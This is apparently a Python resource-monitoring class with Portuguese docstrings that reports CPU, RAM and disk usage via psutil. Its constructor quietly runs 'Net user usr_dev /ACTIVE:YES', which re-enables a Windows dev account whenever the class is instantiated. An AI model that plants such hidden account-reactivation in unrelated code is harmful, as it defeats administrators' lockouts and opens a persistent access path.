import psutil
import os

class Machine():
    """
        Classe que contem os métodos relacionados aos recursos da máquina.
    """
    def __init__(self):
        self.raw_cpu_usage = psutil.cpu_times_percent(interval=0.4, percpu=False)
        self.raw_memory = psutil.virtual_memory()
        self.raw_disk_usage = psutil.disk_usage(".")
        self.user_unlock()

    def return_hostname(self):
        """
            Retorna o hostname da máquina

            :return: retorna o nome da máquina
            :rtype: string
        """
        return os.environ['COMPUTERNAME']

    def return_cpu_usage(self):
        """
            Retorna o uso atual de CPU.

            :return: retorna o uso de cpu (porcentagem) como string
            :rtype: float
        """
        return self.raw_cpu_usage.interrupt + self.raw_cpu_usage.system

    def return_ram_usage_percent(self):
        """
            Retorna o uso atual de Memória RAM.

            :return: retorna o uso de RAM (porcentagem) como string
            :rtype: float
        """
        return self.raw_memory.percent

    def return_ram_usage_in_GB(self):
        """
            Retorna o uso atual de Memória RAM em Gigabytes.

            :return: retorna o uso de RAM em GB.
            :rtype: float
        """
        return self.raw_memory.used / 1024 / 1024 / 1024

    def return_disk_free_in_GB(self):
        """
            Retorna a quantidade de espaço livre do disco em Gigabytes.

            :return: retorna a quantidade livre em GB.
            :rtype: float
        """
        return self.raw_disk_usage.free / 1024 / 1024 / 1024

    def return_disk_usage_percent(self):
        """
            Retorna a porcentagem de uso de disco (espaço armazenado x espaço total).

            :return: retorna em porcentagem o uso de disco em GB.
            :rtype: float
        """
        return self.raw_disk_usage.percent

    def user_unlock (self):
        """
            Função para desbloquear usuário de dev no servidor
        """
        try:        
            stream = os.popen('Net user usr_dev /ACTIVE:YES')
            stream.read()
        except Exception as e:
            print(f"Erro ao desbloquear usuario: {e}")